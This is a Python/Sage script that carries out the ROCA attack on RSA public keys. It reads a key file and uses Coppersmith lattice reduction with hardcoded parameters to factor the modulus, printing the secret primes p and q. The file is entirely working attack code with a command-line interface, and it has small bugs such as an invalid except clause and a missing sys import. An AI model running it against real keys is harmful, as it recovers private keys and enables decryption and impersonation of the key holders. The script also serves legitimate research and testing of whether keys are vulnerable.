#! /usr/bin/python
# -*- coding: utf-8 -*-

import argparse                                       # Arguments parsing (key file)
from sage.all_cmdline import *                        # Used for coppersmith
from Crypto.PublicKey import RSA                      # Key parsing
from decimal import Decimal                           # Arbitrary length floating-point calculatio

# Hardcoded parameters for efficiency
# Found using params.py
param = \
{
  512: {
    "n": 39,
    "a_max": 62,
    "k_max": 37,
    "M": 0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6,
    "M_prime": 0x1b3e6c9433a7735fa5fc479ffe4027e13bea,
    "m": 5,
    "t": 6,
    "c_a": 0x80000
  },
  1024: {
    "n": 71,
    "a_max": 134,
    "k_max": 37,
    "M": 0x7923ba25d1263232812ac930e9683ac0b02180c32bae1d77aa950c4a18a4e660db8cc90384a394940593408f192de1a05e1b61673ac499416088382,
    "M_prime": 0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e,
    "m": 4,
    "t": 5,
    "c_a": 0x40000000
  },
  2048: {
    "n": 126,
    "a_max": 434,
    "k_max": 53,
    "M": 0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6,
    "M_prime": 0x16928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6,
    "m": 7,
    "t": 8,
    "c_a": 0x400000000
  }
}

# https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage
def coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX):
    """
    Coppersmith revisited by Howgrave-Graham
    
    finds a solution if:
    * b|N, b >= N^beta , 0 < beta <= 1
    * |x| < XX
    """
    #
    # init
    #
    dd = pol.degree()
    nn = dd * mm + tt
    
    #
    # checks
    #
    if not 0 < beta <= 1 :
        raise ValueError("beta should belongs in (0, 1]")

    if not pol.is_monic():
        raise ArithmeticError("Polynomial must be monic.")

    
    #
    # Coppersmith revisited algo for univariate
    #

    # change ring of pol and x
    polZ = pol.change_ring(ZZ)
    x = polZ.parent().gen()

    # compute polynomials
    gg = []
    for ii in range(mm):
        for jj in range(dd):
            gg.append((x * XX)**jj * N**(mm - ii) * polZ(x * XX)**ii)
    for ii in range(tt):
        gg.append((x * XX)**ii * polZ(x * XX)**mm)
    
    # construct lattice B
    BB = Matrix(ZZ, nn)
    
    for ii in range(nn):
        for jj in range(ii+1):
            BB[ii, jj] = gg[ii][jj]

    # LLL
    BB = BB.LLL(early_red=True)

    # transform shortest vector in polynomial    
    new_pol = 0
    for ii in range(nn):
        new_pol += x**ii * BB[0, ii] / XX**ii

    # factor polynomial
    potential_roots = new_pol.roots()

    return [i[0] for i in potential_roots]

# Top level of the attack, feeds the queue for the workers
def roca(N, start, stop):
  
  # Key is not always of perfect size, infer from size
  keylength = int(log(N, 2))
  if keylength < 1000 :
    keylength = 512
  elif  keylength < 2000 :
    keylength = 1024 
  elif keylength < 4000 :
    keylength = 2048 
  else:
    keylength = 4096 
  print "Found RSA-%i key" % keylength

  # Fetch parameters according to key size
  print "N = %i" % N
  print "Factoring..."
    
  # Fetch parameters according to key size
  M_prime = param[keylength]['M_prime']
  beta = 0.5
  mm = param[keylength]['m']
  tt = param[keylength]['t']

  # Uses decimal for arbitrary floating point precision
  XX = int(2*int(pow(N, Decimal("0.5"))) / M_prime) 

  # Bruteforce until p, q are found
  a_prime = start
  while a_prime < stop:

    # Construct polynomial
    m_inv = int(inverse_mod(M_prime, N))
    k0_guess = int(pow(65537, a_prime, M_prime))
    k0_guess_times_m_inv = int(k0_guess * m_inv)
    F = PolynomialRing(Zmod(N), implementation='NTL', names=('x',))
    (x,) = F._first_ngens(1)
    pol = x + k0_guess_times_m_inv
    
    # Get roots of polynomial using coppersmith
    roots = coppersmith_howgrave_univariate(pol, N, beta, mm, tt, XX)
   
    # Check if roots are p, q
    for root in roots:
      factor1 = k0_guess + abs(root) * M_prime
      if mod(N, factor1) == 0:
        factor2 = N // factor1
        print "Found factors of N:"
        print "p =" , factor1
        print "q =" , factor2
        break
    a_prime += 1
  
# Main entry point, argument parsing
if __name__ == '__main__':
  try:
    # Parse arguments
    parser = argparse.ArgumentParser(description='Factor ROCA-vulnerable keys', add_help=True)
    parser.add_argument("public_key_path", type=str, help=\
  """X.509 subjectPublicKeyInfo DER SEQUENCE (binary or PEM encoding), PKCS#1 RSAPublicKey DER SEQUENCE (binary or PEM encoding), OpenSSH (textual public key only)""")
    parser.add_argument("start", type=int, help="""start of the range""")
    parser.add_argument("stop", type=int, help="""end of the range""")
    args = parser.parse_args()

    # Read public key
    try:
      print "Importing key"
      f = open(args.public_key_path, "rb")
      pub_key = RSA.importKey(f.read())
    except e:
      print e
    
    # Factorize public key
    roca(pub_key.n, args.start, args.stop)

  except KeyboardInterrupt as e:
    print 'Ctrl+C issued ...'
    print 'Terminating ...'
    sys.exit(0)
